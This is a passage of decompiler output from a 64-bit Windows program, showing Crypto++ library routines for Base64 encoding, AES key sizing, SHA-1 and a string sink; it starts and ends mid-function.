  sub_13F128E90((__int64)v5, 0i64);
  *v5 = off_13F19BE68;
  v5[1] = off_13F19B598;
  v5[7] = -1i64;
  v5[8] = 0i64;
  v5[9] = 0i64;
  v5[11] = -1i64;
  v5[12] = 0i64;
  v5[13] = 0i64;
  v5[14] = 0i64;
  v5[15] = 0i64;
  sub_13F129580((__int64)v5, 0i64);
  sub_13F128E90(v4, 0i64);
  *(_QWORD *)v4 = &CryptoPP::BaseN_Encoder::`vftable';
  *(_QWORD *)(v4 + 8) = off_13F19C038;
  *(_QWORD *)(v4 + 48) = 0i64;
  *(_QWORD *)(v4 + 56) = 0i64;
  *(_QWORD *)(v4 + 64) = 0i64;
  *(_DWORD *)(v4 + 72) = 0;
  *(_QWORD *)(v4 + 88) = -1i64;
  *(_QWORD *)(v4 + 96) = 0i64;
  *(_QWORD *)(v4 + 104) = 0i64;
  sub_13F129580(v4, (__int64)v5);
  sub_13F128FE0((__int64)a1, v4, 0i64, 0i64, a2);
  *a1 = off_13F19BB88;
  a1[1] = off_13F19BFF0;
  v6 = sub_13F12AA90((__int64)&v14);
  v7 = (_QWORD *)sub_13F14059C(40i64);
  v7[2] = 0i64;
  v7[4] = 0i64;
  v7[1] = "InsertLineBreaks";
  *((_WORD *)v7 + 8) = 1;
  v7[3] = 0i64;
  *v7 = &CryptoPP::AlgorithmParametersTemplate<bool>::`vftable';
  *((_BYTE *)v7 + 32) = 0;
  v19 = v7;
  v8 = *(_QWORD *)(v6 + 8);
  *(_QWORD *)(v6 + 8) = 0i64;
  v9 = (void (__fastcall ***)(_QWORD, __int64))v7[3];
  if ( v9 )
    (**v9)(v9, 1i64);
  v7[3] = v8;
  v19 = 0i64;
  v10 = *(void (__fastcall ****)(_QWORD, __int64))(v6 + 8);
  if ( v10 )
    (**v10)(v10, 1i64);
  *(_QWORD *)(v6 + 8) = v7;
  *(_BYTE *)(v6 + 16) = 1;
  v11 = sub_13F12AA30((__int64)v16, v6);
  if ( v15 )
    (**v15)(v15, 1i64);
  v14 = &CryptoPP::NameValuePairs::`vftable';
  v12 = sub_13F107780(v11, (__int64)"MaxLineLength", &v18);
  sub_13F111BC0((__int64)a1, v12);
  if ( v17 )
    (**v17)(v17, 1i64);
  return a1;
}
// 13F182E30: using guessed type void *CryptoPP::NameValuePairs::`vftable';
// 13F1884D0: using guessed type void *CryptoPP::AlgorithmParametersTemplate<bool>::`vftable';
// 13F19B408: using guessed type void *CryptoPP::BaseN_Encoder::`vftable';
// 13F19B598: using guessed type void *off_13F19B598[3];
// 13F19BB88: using guessed type __int64 (__fastcall *off_13F19BB88[61])();
// 13F19BE68: using guessed type __int64 (__fastcall *off_13F19BE68[49])();
// 13F19BFF0: using guessed type __int64 (__fastcall *off_13F19BFF0[3])();
// 13F19C038: using guessed type void *off_13F19C038[3];
// 13F103C80: using guessed type char var_50[8];

//----- (000000013F103F20) ----------------------------------------------------
unsigned __int64 __fastcall sub_13F103F20(_QWORD *a1)
{
  __int64 v2; // rdx
  unsigned __int64 v3; // rcx
  void *v4; // rdx
  __int64 v5; // rcx
  unsigned __int64 result; // rax
  __int64 v7; // rdx
  _DWORD *v8; // rdi
  __int64 i; // rcx

  v2 = 10i64;
  if ( a1[9] < a1[10] )
    v2 = 9i64;
  v3 = a1[v2];
  v4 = (void *)a1[11];
  if ( v4 )
  {
    memset(v4, 0, v3);
    sub_13F12E550(v4);
  }
  v5 = 6i64;
  result = a1[6];
  if ( a1[5] < result )
    v5 = 5i64;
  v7 = a1[7];
  if ( v7 )
  {
    v8 = (_DWORD *)a1[7];
    for ( i = a1[v5]; i; --i )
      *v8++ = 0;
    return sub_13F12E4D0(v7);
  }
  return result;
}
// 13F12E550: using guessed type __int64 __fastcall sub_13F12E550(_QWORD);

//----- (000000013F103FB0) ----------------------------------------------------
void **__fastcall sub_13F103FB0(__int64 a1)
{
  __int64 v1; // rbx
  void **result; // rax

  v1 = a1 + 24;
  sub_13F105B40((_QWORD *)(a1 + 24));
  result = &CryptoPP::NameValuePairs::`vftable';
  *(_QWORD *)(v1 + 520) = &CryptoPP::NameValuePairs::`vftable';
  return result;
}
// 13F182E30: using guessed type void *CryptoPP::NameValuePairs::`vftable';

//----- (000000013F103FE0) ----------------------------------------------------
void *__fastcall sub_13F103FE0(__int64 a1)
{
  void (__fastcall ***v2)(_QWORD, __int64); // rcx
  unsigned __int64 v3; // r8
  void *v4; // rdi
  unsigned __int64 v5; // rcx
  void *v6; // rdi
  unsigned __int64 v7; // r8
  unsigned __int64 v8; // rcx
  void *result; // rax

  v2 = *(void (__fastcall ****)(_QWORD, __int64))(a1 + 136);
  if ( v2 )
    (**v2)(v2, 1i64);
  v3 = *(_QWORD *)(a1 + 112);
  v4 = *(void **)(a1 + 128);
  v5 = *(_QWORD *)(a1 + 120);
  if ( v4 == (void *)(a1 + 64 + (((_BYTE)a1 + 64) & 0xF)) )
  {
    *(_BYTE *)(a1 + 105) = 0;
    if ( v3 < v5 )
      v5 = v3;
    memset(v4, 0, v5);
  }
  v6 = *(void **)(a1 + 56);
  v7 = *(_QWORD *)(a1 + 40);
  v8 = *(_QWORD *)(a1 + 48);
  result = (void *)(a1 + 8 + (((_BYTE)a1 + 8) & 0xF));
  if ( v6 == result )
  {
    *(_BYTE *)(a1 + 33) = 0;
    if ( v7 < v8 )
      v8 = v7;
    result = 0i64;
    memset(v6, 0, v8);
  }
  return result;
}

//----- (000000013F104070) ----------------------------------------------------
void *__fastcall sub_13F104070(__int64 a1)
{
  void *v1; // rdi
  unsigned __int64 v2; // r8
  unsigned __int64 v3; // rdx
  void *result; // rax

  v1 = *(void **)(a1 + 48);
  v2 = *(_QWORD *)(a1 + 32);
  v3 = *(_QWORD *)(a1 + 40);
  result = (void *)(a1 + (a1 & 0xF));
  if ( v1 == result )
  {
    *(_BYTE *)(a1 + 25) = 0;
    if ( v2 < v3 )
      v3 = v2;
    result = 0i64;
    memset(v1, 0, v3);
  }
  return result;
}

//----- (000000013F1040B0) ----------------------------------------------------
void *__fastcall sub_13F1040B0(__int64 a1)
{
  void *v1; // rdi
  unsigned __int64 v2; // r8
  unsigned __int64 v3; // rdx
  void *result; // rax

  v1 = *(void **)(a1 + 64);
  v2 = *(_QWORD *)(a1 + 48);
  v3 = *(_QWORD *)(a1 + 56);
  result = (void *)(a1 + (a1 & 0xF));
  if ( v1 == result )
  {
    *(_BYTE *)(a1 + 41) = 0;
    if ( v2 < v3 )
      v3 = v2;
    result = 0i64;
    memset(v1, 0, v3);
  }
  return result;
}

//----- (000000013F1040F0) ----------------------------------------------------
void **__fastcall sub_13F1040F0(__int64 a1)
{
  __int64 v1; // rbx
  void **result; // rax

  v1 = a1 + 24;
  sub_13F105A90((_QWORD *)(a1 + 24));
  result = &CryptoPP::NameValuePairs::`vftable';
  *(_QWORD *)(v1 + 120) = &CryptoPP::NameValuePairs::`vftable';
  return result;
}
// 13F182E30: using guessed type void *CryptoPP::NameValuePairs::`vftable';

//----- (000000013F104120) ----------------------------------------------------
__int64 __fastcall sub_13F104120(__int64 a1, __int64 a2)
{
  sub_13F106580(a2);
  return a2;
}

//----- (000000013F104140) ----------------------------------------------------
__int64 __fastcall sub_13F104140(__int64 a1)
{
  __int64 v1; // rax
  __int64 v2; // rcx
  __int64 (__fastcall *v3)(__int64); // rdx

  v1 = *(_QWORD *)(a1 - 16);
  v2 = a1 - 16;
  v3 = *(__int64 (__fastcall **)(__int64))(v1 + 64);
  if ( v3 == sub_13F104200 )
    return v2 + 24;
  else
    return v3(v2);
}

//----- (000000013F104170) ----------------------------------------------------
__int64 sub_13F104170()
{
  return sub_13F107870();
}
// 13F104170: using guessed type __int64 __fastcall sub_13F104170();

//----- (000000013F104180) ----------------------------------------------------
__int64 __fastcall sub_13F104180(__int64 a1)
{
  __int64 v1; // rax
  __int64 v2; // rcx
  __int64 (__fastcall *v3)(__int64); // rdx

  v1 = *(_QWORD *)(a1 - 8);
  v2 = a1 - 8;
  v3 = *(__int64 (__fastcall **)(__int64))(v1 + 64);
  if ( v3 == sub_13F104200 )
    return v2 + 40;
  else
    return v3(v2) + 16;
}

//----- (000000013F1041C0) ----------------------------------------------------
__int64 __fastcall sub_13F1041C0(__int64 a1)
{
  __int64 v1; // rax
  __int64 v2; // rcx
  __int64 (__fastcall *v3)(__int64); // rdx

  v1 = *(_QWORD *)(a1 - 8);
  v2 = a1 - 8;
  v3 = *(__int64 (__fastcall **)(__int64))(v1 + 72);
  if ( v3 == sub_13F104200 )
    return v2 + 40;
  else
    return v3(v2) + 16;
}

//----- (000000013F104200) ----------------------------------------------------
__int64 __fastcall sub_13F104200(__int64 a1)
{
  return a1 + 24;
}

//----- (000000013F104210) ----------------------------------------------------
__int64 __fastcall sub_13F104210(__int64 a1)
{
  __int64 v1; // rax
  __int64 v2; // rcx
  __int64 (__fastcall *v3)(__int64); // rdx

  v1 = *(_QWORD *)(a1 - 16);
  v2 = a1 - 16;
  v3 = *(__int64 (__fastcall **)(__int64))(v1 + 64);
  if ( v3 == sub_13F104200 )
    return v2 + 144;
  else
    return v3(v2) + 120;
}

//----- (000000013F104250) ----------------------------------------------------
__int64 __fastcall sub_13F104250(__int64 a1)
{
  __int64 v1; // rax
  __int64 v2; // rcx
  __int64 (__fastcall *v3)(__int64); // rdx

  v1 = *(_QWORD *)(a1 - 8);
  v2 = a1 - 8;
  v3 = *(__int64 (__fastcall **)(__int64))(v1 + 64);
  if ( v3 == sub_13F104200 )
    return v2 + 160;
  else
    return v3(v2) + 136;
}

//----- (000000013F104290) ----------------------------------------------------
__int64 __fastcall sub_13F104290(__int64 a1)
{
  __int64 v1; // rax
  __int64 v2; // rcx
  __int64 (__fastcall *v3)(__int64); // rdx

  v1 = *(_QWORD *)(a1 - 8);
  v2 = a1 - 8;
  v3 = *(__int64 (__fastcall **)(__int64))(v1 + 72);
  if ( v3 == sub_13F104200 )
    return v2 + 160;
  else
    return v3(v2) + 136;
}

//----- (000000013F1042D0) ----------------------------------------------------
_QWORD *__fastcall sub_13F1042D0(__int64 a1)
{
  _QWORD *result; // rax
  _QWORD *v3; // [rsp+48h] [rbp+10h]

  v3 = (_QWORD *)sub_13F14059C(96i64);
  sub_13F15EF70((__int64)v3, 0, 0x60ui64);
  sub_13F106340((__int64)v3, a1 - 8);
  *v3 = off_13F1880A8;
  result = v3 + 1;
  v3[1] = off_13F188128;
  return result;
}
// 13F1880A8: using guessed type __int64 (__fastcall *off_13F1880A8[16])();
// 13F188128: using guessed type void *off_13F188128[11];

//----- (000000013F104340) ----------------------------------------------------
__int64 __fastcall sub_13F104340(_QWORD *a1)
{
  unsigned __int64 v1; // rdx
  __int64 v2; // r8
  _DWORD *v3; // rdi
  unsigned __int64 i; // rcx
  __int64 result; // rax

  v1 = a1[2];
  if ( a1[1] < v1 )
    v1 = a1[1];
  v2 = a1[3];
  if ( v2 )
  {
    v3 = (_DWORD *)a1[3];
    for ( i = v1; i; --i )
      *v3++ = 0;
    return sub_13F12E4D0(v2);
  }
  return result;
}

//----- (000000013F104380) ----------------------------------------------------
__m128i *__fastcall sub_13F104380(__int64 a1, __m128i *a2)
{
  a2[1].m128i_i64[0] = 0i64;
  a2[1].m128i_i64[1] = 15i64;
  a2->m128i_i8[0] = 0;
  sub_13F106C50(a2, (const __m128i *)"AES", 3ui64);
  return a2;
}

//----- (000000013F1043C0) ----------------------------------------------------
__int64 sub_13F1043C0()
{
  return 4i64;
}

//----- (000000013F1043D0) ----------------------------------------------------
unsigned __int64 __fastcall sub_13F1043D0(__int64 a1, unsigned __int64 a2)
{
  if ( a2 <= 0x10 )
    return 16i64;
  if ( a2 < 0x20 )
    return a2 - (((_BYTE)a2 - 1) & 7) + 7;
  return 32i64;
}

//----- (000000013F104400) ----------------------------------------------------
__int64 sub_13F104400()
{
  return 16i64;
}
// 13F104400: using guessed type __int64 __fastcall sub_13F104400();

//----- (000000013F104410) ----------------------------------------------------
__int64 sub_13F104410()
{
  return 32i64;
}
// 13F104410: using guessed type __int64 __fastcall sub_13F104410();

//----- (000000013F104430) ----------------------------------------------------
__int64 __fastcall sub_13F104430(__int64 a1)
{
  __int64 v1; // rax
  __int64 v2; // rcx

  v1 = *(_QWORD *)(a1 - 24);
  v2 = a1 - 24;
  if ( (void **)v1 == off_13F1865C0 )
    return (*(__int64 (__fastcall **)(__int64))(v1 + 16))(v2);
  else
    return (*(__int64 (__fastcall **)(__int64))(v1 + 24))(v2);
}
// 13F1865C0: using guessed type void *off_13F1865C0[12];

//----- (000000013F104460) ----------------------------------------------------
__int64 (__fastcall **__fastcall sub_13F104460(__int64 a1, __int64 a2))()
{
  __int64 v2; // rax
  __int64 v3; // rcx
  __int64 (__fastcall **(__fastcall *v4)(__int64, __int64))(); // r8

  v2 = *(_QWORD *)(a1 - 16);
  v3 = a1 - 16;
  v4 = *(__int64 (__fastcall **(__fastcall **)(__int64, __int64))())(v2 + 8);
  if ( v4 == sub_13F103A40 )
    return sub_13F10B730(v3 + 120, a2);
  else
    return (__int64 (__fastcall **)())((__int64 (__fastcall *)(__int64))v4)(v3);
}

//----- (000000013F1044A0) ----------------------------------------------------
__int64 __fastcall sub_13F1044A0(__int64 a1)
{
  __int64 v1; // rax
  __int64 v2; // rcx
  __int64 (__fastcall *v3)(__int64); // r8

  v1 = *(_QWORD *)(a1 - 16);
  v2 = a1 - 16;
  v3 = *(__int64 (__fastcall **)(__int64))(v1 + 24);
  if ( v3 == sub_13F1029F0 )
    return (*(__int64 (__fastcall **)(__int64))(v1 + 16))(v2);
  else
    return v3(v2);
}

//----- (000000013F1044D0) ----------------------------------------------------
__int64 __fastcall sub_13F1044D0(__int64 *a1)
{
  __int64 v2; // rcx
  unsigned __int64 v3; // rdx
  __int64 result; // rax

  v2 = *a1;
  if ( v2 )
  {
    v3 = (a1[2] - v2) & 0xFFFFFFFFFFFFFFFCui64;
    if ( v3 >= 0x1000 )
    {
      v3 += 39i64;
      if ( (unsigned __int64)(v2 - *(_QWORD *)(v2 - 8) - 8) > 0x1F )
        sub_13F1682C0();
      v2 = *(_QWORD *)(v2 - 8);
    }
    sub_13F14088C(v2, v3);
    result = 0i64;
    *a1 = 0i64;
    a1[1] = 0i64;
    a1[2] = 0i64;
  }
  return result;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F104530) ----------------------------------------------------
_QWORD *sub_13F104530()
{
  _QWORD *result; // rax

  result = (_QWORD *)sub_13F14059C(8i64);
  *result = &CryptoPP::P1363_MGF1::`vftable';
  return result;
}
// 13F1861C0: using guessed type void *CryptoPP::P1363_MGF1::`vftable';

//----- (000000013F104550) ----------------------------------------------------
__int64 sub_13F104550()
{
  __int64 v0; // rbx
  _DWORD *v1; // rcx
  __int64 v2; // rdx

  v0 = sub_13F14059C(208i64);
  sub_13F15EF70(v0, 0, 0xD0ui64);
  sub_13F10EE30(v0, 1);
  v1 = 0i64;
  *(_QWORD *)(v0 + 8) = 0i64;
  *(_BYTE *)(v0 + 81) = 0;
  *(_QWORD *)(v0 + 88) = 0x3FFFFFFFFFFFFFFFi64;
  *(_QWORD *)(v0 + 96) = 16i64;
  if ( *(_BYTE *)(v0 + 81) )
  {
    v2 = 0i64;
  }
  else
  {
    *(_BYTE *)(v0 + 81) = 1;
    v2 = v0 + 16;
  }
  *(_QWORD *)(v0 + 104) = v2;
  *(_BYTE *)(v0 + 177) = 0;
  *(_QWORD *)(v0 + 184) = 0x3FFFFFFFFFFFFFFFi64;
  *(_QWORD *)(v0 + 192) = 16i64;
  if ( !*(_BYTE *)(v0 + 177) )
  {
    *(_BYTE *)(v0 + 177) = 1;
    v1 = (_DWORD *)(v0 + 112);
  }
  *(_QWORD *)(v0 + 200) = v1;
  sub_13F12F4B0(v1);
  *(_QWORD *)v0 = &CryptoPP::SHA1::`vftable';
  return v0;
}
// 13F104550: using guessed type __int64 __fastcall sub_13F104550();
// 13F1856E0: using guessed type void *CryptoPP::SHA1::`vftable';

//----- (000000013F104610) ----------------------------------------------------
__int64 sub_13F104610()
{
  return 20i64;
}
// 13F104610: using guessed type __int64 __fastcall sub_13F104610();

//----- (000000013F104620) ----------------------------------------------------
__int64 __fastcall sub_13F104620(__int64 a1)
{
  __int64 v2; // rsi
  __m128i *v3; // rdi
  __int64 v4; // rax
  __m128i *v5; // rcx
  const __m128i *v6; // r8
  __int64 v7; // rax
  const __m128i *v8; // r8

  v2 = sub_13F14059C(208i64);
  sub_13F15EF70(v2, 0, 0xD0ui64);
  v3 = 0i64;
  *(_DWORD *)(v2 + 8) = *(_DWORD *)(a1 + 8);
  *(_DWORD *)(v2 + 12) = *(_DWORD *)(a1 + 12);
  *(_BYTE *)(v2 + 81) = 0;
  *(_QWORD *)(v2 + 88) = *(_QWORD *)(a1 + 88);
  v4 = *(_QWORD *)(a1 + 96);
  *(_QWORD *)(v2 + 96) = v4;
  if ( *(_QWORD *)(a1 + 96) > 0x10ui64 || *(_BYTE *)(v2 + 81) )
  {
    v5 = 0i64;
  }
  else
  {
    *(_BYTE *)(v2 + 81) = 1;
    v5 = (__m128i *)(v2 + 16);
  }
  *(_QWORD *)(v2 + 104) = v5;
  if ( v5 )
  {
    v6 = *(const __m128i **)(a1 + 104);
    if ( v6 )
      sub_13F17AFE0(v5, 4 * v4, v6, 4i64 * *(_QWORD *)(a1 + 96));
  }
  *(_BYTE *)(v2 + 177) = 0;
  *(_QWORD *)(v2 + 184) = *(_QWORD *)(a1 + 184);
  v7 = *(_QWORD *)(a1 + 192);
  *(_QWORD *)(v2 + 192) = v7;
  if ( *(_QWORD *)(a1 + 192) <= 0x10ui64 && !*(_BYTE *)(v2 + 177) )
  {
    *(_BYTE *)(v2 + 177) = 1;
    v3 = (__m128i *)(v2 + 112);
  }
  *(_QWORD *)(v2 + 200) = v3;
  if ( v3 )
  {
    v8 = *(const __m128i **)(a1 + 200);
    if ( v8 )
      sub_13F17AFE0(v3, 4 * v7, v8, 4i64 * *(_QWORD *)(a1 + 192));
  }
  *(_QWORD *)v2 = &CryptoPP::SHA1::`vftable';
  return v2;
}
// 13F1856E0: using guessed type void *CryptoPP::SHA1::`vftable';

//----- (000000013F104750) ----------------------------------------------------
__m128i *__fastcall sub_13F104750(__int64 a1, __m128i *a2)
{
  a2[1].m128i_i64[0] = 0i64;
  a2[1].m128i_i64[1] = 15i64;
  a2->m128i_i8[0] = 0;
  sub_13F106C50(a2, (const __m128i *)"SHA-1", 5ui64);
  return a2;
}

//----- (000000013F104790) ----------------------------------------------------
__int64 __fastcall sub_13F104790(__int64 a1)
{
  return *(_QWORD *)(a1 + 104);
}

//----- (000000013F1047A0) ----------------------------------------------------
__int64 sub_13F1047A0()
{
  return 64i64;
}
// 13F1047A0: using guessed type __int64 __fastcall sub_13F1047A0();

//----- (000000013F1047B0) ----------------------------------------------------
__int64 __fastcall sub_13F1047B0(__int64 a1)
{
  return *(_QWORD *)(a1 + 200);
}

//----- (000000013F1047C0) ----------------------------------------------------
void __fastcall sub_13F1047C0(__int64 a1)
{
  sub_13F12F4B0(*(_DWORD **)(a1 + 200));
}

//----- (000000013F1047E0) ----------------------------------------------------
__int64 __fastcall sub_13F1047E0(__int64 a1)
{
  __int64 (*v1)(void); // rdx

  v1 = *(__int64 (**)(void))(*(_QWORD *)a1 + 72i64);
  if ( v1 == sub_13F1047A0 )
    return 64i64;
  else
    return v1();
}
// 13F1047A0: using guessed type __int64 __fastcall sub_13F1047A0();

//----- (000000013F104810) ----------------------------------------------------
__int64 __fastcall sub_13F104810(__int64 a1, unsigned __int64 a2)
{
  if ( a2 > (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 40i64))(a1) )
    return 0i64;
  else
    return (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 32i64))(a1);
}

//----- (000000013F104850) ----------------------------------------------------
__int64 __fastcall sub_13F104850(__int64 a1, __int64 a2)
{
  if ( a2 == (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 32i64))(a1) )
    return (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 40i64))(a1);
  else
    return 0i64;
}

//----- (000000013F104890) ----------------------------------------------------
__int64 __fastcall sub_13F104890(_QWORD *a1)
{
  __int64 (__fastcall *v1)(__int64); // rax
  __int64 (__fastcall *v2)(__int64); // rdx
  _QWORD *v3; // rcx
  __int64 v4; // rcx
  __int64 v5; // rbx
  unsigned __int64 v6; // rcx
  __int64 v7; // rdx
  __int64 v9; // rax
  char v10[16]; // [rsp+28h] [rbp-40h] BYREF
  unsigned __int64 v11; // [rsp+38h] [rbp-30h]
  unsigned __int64 v12; // [rsp+40h] [rbp-28h]
  void *v13; // [rsp+48h] [rbp-20h]

  v1 = *(__int64 (__fastcall **)(__int64))(a1[2] + 8i64);
  if ( v1 == sub_13F104140 )
  {
    v2 = *(__int64 (__fastcall **)(__int64))(*a1 + 64i64);
    if ( v2 == sub_13F104200 )
    {
      v3 = a1 + 3;
      goto LABEL_5;
    }
    v9 = v2((__int64)a1);
  }
  else
  {
    v9 = v1((__int64)(a1 + 2));
  }
  v3 = (_QWORD *)v9;
LABEL_5:
  v4 = (*(__int64 (__fastcall **)(_QWORD *, char *))(*v3 + 32i64))(v3, v10);
  v5 = (unsigned int)sub_13F11C050(v4);
  v6 = v12;
  if ( v11 < v12 )
    v6 = v11;
  v7 = (__int64)v13;
  if ( v13 )
  {
    memset(v13, 0, 8 * v6);
    sub_13F12E4D0(v7);
  }
  return v5;
}
// 13F104890: using guessed type char var_40[16];

//----- (000000013F104930) ----------------------------------------------------
__int64 __fastcall sub_13F104930(_QWORD *a1)
{
  __int64 (__fastcall *v2)(); // rdx
  __int64 v3; // rax
  __int64 v4; // rsi
  __int64 (__fastcall *v5)(__int64); // rdx
  __int64 (__fastcall *v6)(__int64); // rdx
  _QWORD *v7; // rcx
  __int64 v8; // rax
  unsigned int v9; // eax
  unsigned int v10; // eax
  __int64 v11; // rbx
  unsigned __int64 v12; // rcx
  __int64 v13; // r8
  char v15[16]; // [rsp+28h] [rbp-40h] BYREF
  unsigned __int64 v16; // [rsp+38h] [rbp-30h]
  unsigned __int64 v17; // [rsp+40h] [rbp-28h]
  void *v18; // [rsp+48h] [rbp-20h]

  v2 = *(__int64 (__fastcall **)())(a1[2] + 24i64);
  if ( v2 == sub_13F104170 )
    v3 = sub_13F107870();
  else
    v3 = ((__int64 (__fastcall *)(_QWORD *))v2)(a1 + 2);
  v4 = v3;
  v5 = *(__int64 (__fastcall **)(__int64))(a1[2] + 8i64);
  if ( v5 == sub_13F104140 )
  {
    v6 = *(__int64 (__fastcall **)(__int64))(*a1 + 64i64);
    if ( v6 == sub_13F104200 )
      v7 = a1 + 3;
    else
      v7 = (_QWORD *)v6((__int64)a1);
  }
  else
  {
    v7 = (_QWORD *)v5((__int64)(a1 + 2));
  }
  v8 = (*(__int64 (__fastcall **)(_QWORD *, char *))(*v7 + 8i64))(v7, v15);
  v9 = sub_13F11BFE0(v8);
  if ( v9 <= 1 )
    v10 = 0;
  else
    v10 = v9 - 1;
  v11 = v10;
  v12 = v17;
  if ( v16 < v17 )
    v12 = v16;
  v13 = (__int64)v18;
  if ( v18 )
  {
    memset(v18, 0, 8 * v12);
    sub_13F12E4D0(v13);
  }
  return (*(__int64 (__fastcall **)(__int64, __int64))(*(_QWORD *)v4 + 16i64))(v4, v11);
}
// 13F104170: using guessed type __int64 __fastcall sub_13F104170();
// 13F104930: using guessed type char var_40[16];

//----- (000000013F104A30) ----------------------------------------------------
bool __fastcall sub_13F104A30(__int64 a1, unsigned __int8 *a2)
{
  __int64 v2; // rax
  __int64 v3; // rcx
  __int64 (__fastcall *v5)(); // r8
  __int64 v6; // rax
  bool (__fastcall *v7)(__int64, unsigned __int8 *); // r8

  v2 = *(_QWORD *)(a1 + 16);
  v3 = a1 + 16;
  v5 = *(__int64 (__fastcall **)())(v2 + 24);
  if ( v5 == sub_13F104170 )
    v6 = sub_13F107870();
  else
    v6 = ((__int64 (__fastcall *)(__int64))v5)(v3);
  v7 = *(bool (__fastcall **)(__int64, unsigned __int8 *))(*(_QWORD *)v6 + 8i64);
  if ( v7 == sub_13F1037B0 )
    return (unsigned int)sub_13F16A230(a2, (__int64)"EncodingParameters") == 0;
  else
    return v7(v6, a2);
}
// 13F104170: using guessed type __int64 __fastcall sub_13F104170();

//----- (000000013F104AA0) ----------------------------------------------------
__int64 __fastcall sub_13F104AA0(__int64 a1)
{
  return (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)(a1 + 48) + 120i64))(a1 + 48);
}

//----- (000000013F104AB0) ----------------------------------------------------
__int64 __fastcall sub_13F104AB0(__int64 a1)
{
  return (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)(a1 + 48) + 112i64))(a1 + 48);
}

//----- (000000013F104AC0) ----------------------------------------------------
bool __fastcall sub_13F104AC0(__int64 a1)
{
  __int64 v1; // rbx

  v1 = a1 + 48;
  return !(*(unsigned __int8 (__fastcall **)(__int64))(*(_QWORD *)(a1 + 48) + 136i64))(a1 + 48)
      && !(*(unsigned __int8 (__fastcall **)(__int64))(*(_QWORD *)v1 + 200i64))(v1);
}

//----- (000000013F104B00) ----------------------------------------------------
__int64 __fastcall sub_13F104B00(__int64 a1, char a2)
{
  __int64 v4; // rax

  v4 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 336i64))(a1);
  return sub_13F1114A0(a1 + 48, v4, (__int64)&qword_13F1B7008, a2);
}
// 13F1B7008: using guessed type __int64 qword_13F1B7008;

//----- (000000013F104B40) ----------------------------------------------------
__int64 __fastcall sub_13F104B40(__int64 a1, unsigned int *a2, char a3)
{
  __int64 v6; // rax

  v6 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 336i64))(a1);
  return sub_13F111680(a1 + 48, v6, a2, (__int64)&qword_13F1B7008, a3);
}
// 13F1B7008: using guessed type __int64 qword_13F1B7008;

//----- (000000013F104B90) ----------------------------------------------------
__int64 __fastcall sub_13F104B90(_QWORD *a1, __int64 a2, char a3)
{
  _QWORD *v3; // rbx
  __int64 v4; // rdi
  __int64 v7; // rax
  char v9; // [rsp+20h] [rbp-18h]

  v3 = a1 + 6;
  v4 = a1[6];
  v7 = (*(__int64 (__fastcall **)(_QWORD *))(*a1 + 336i64))(a1);
  v9 = a3;
  return (*(__int64 (__fastcall **)(_QWORD *, __int64, __int64, __int64 *, char))(v4 + 256))(
           v3,
           v7,
           a2,
           &qword_13F1B7008,
           v9);
}
// 13F1B7008: using guessed type __int64 qword_13F1B7008;

//----- (000000013F104BF0) ----------------------------------------------------
__int64 __fastcall sub_13F104BF0(__int64 a1)
{
  return (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)(a1 + 48) + 64i64))(a1 + 48);
}

//----- (000000013F104C00) ----------------------------------------------------
void __noreturn sub_13F104C00()
{
  char pExceptionObject[72]; // [rsp+20h] [rbp-48h] BYREF

  sub_13F106970((__int64)pExceptionObject);
  CxxThrowException(
    pExceptionObject,
    (_ThrowInfo *)&_TI4_AUInputRejected___InputRejecting_VFilter_CryptoPP___CryptoPP__);
}
// 13F104C00: using guessed type void __fastcall __noreturn sub_13F104C00();

//----- (000000013F104C20) ----------------------------------------------------
__int64 __fastcall sub_13F104C20(__int64 a1, const __m128i *a2, unsigned __int64 a3)
{
  __m128i *v6; // r9
  __m128i *v7; // rcx
  unsigned __int64 v8; // rdx
  unsigned __int64 v9; // r8
  __m128i *v10; // rdx
  __int8 *v11; // rdx
  __m128i *v12; // rax

  if ( a3 )
  {
    v6 = *(__m128i **)(a1 + 24);
    v7 = v6;
    v8 = v6[1].m128i_u64[0];
    if ( a3 < v8 && a3 + v8 > v6[1].m128i_i64[1] )
    {
      sub_13F106B80(v6, 2 * v8);
      v7 = *(__m128i **)(a1 + 24);
    }
    v9 = v7[1].m128i_u64[1];
    v10 = v7;
    if ( v9 >= 0x10 )
      v10 = (__m128i *)v7->m128i_i64[0];
    v11 = &v10->m128i_i8[v7[1].m128i_i64[0]];
    v12 = v7;
    if ( v9 >= 0x10 )
      v12 = (__m128i *)v7->m128i_i64[0];
    sub_13F108070(v7, v11 - (__int8 *)v12, 0i64, a2, a3);
  }
  return 0i64;
}

//----- (000000013F104CA0) ----------------------------------------------------
__int64 __fastcall sub_13F104CA0(__int64 a1, __int64 a2)
{
  __int64 result; // rax
  __m128i v3[2]; // [rsp+28h] [rbp-70h] BYREF
  char pExceptionObject[72]; // [rsp+50h] [rbp-48h] BYREF

  result = (*(__int64 (__fastcall **)(__int64, const char *, void ***, __int64, __int64))(*(_QWORD *)a2 + 8i64))(
             a2,
             "OutputStringPointer",
             &std::string * `RTTI Type Descriptor',
             a1 + 24,
             -2i64);
  if ( !(_BYTE)result )
  {
    sub_13F1053B0(v3, (const __m128i *)"StringSink: OutputStringPointer not specified");
    sub_13F101600((__int64)pExceptionObject, v3);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
  return result;
}
// 13F1C3FC0: using guessed type void **std::string * `RTTI Type Descriptor';
// 13F104CA0: using guessed type __m128i var_70[2];

//----- (000000013F104D10) ----------------------------------------------------
__int64 __fastcall sub_13F104D10(__int64 a1, __int64 a2, unsigned __int8 a3, int a4)
{
  __int64 v8; // rax
  __m128i v10[2]; // [rsp+38h] [rbp-90h] BYREF
  char pExceptionObject[104]; // [rsp+60h] [rbp-68h] BYREF

  if ( a3
    && (*(__int64 (__fastcall ***)())a1 == off_13F188A30
     || !(*(unsigned __int8 (__fastcall **)(__int64))(*(_QWORD *)a1 + 384i64))(a1)) )
  {
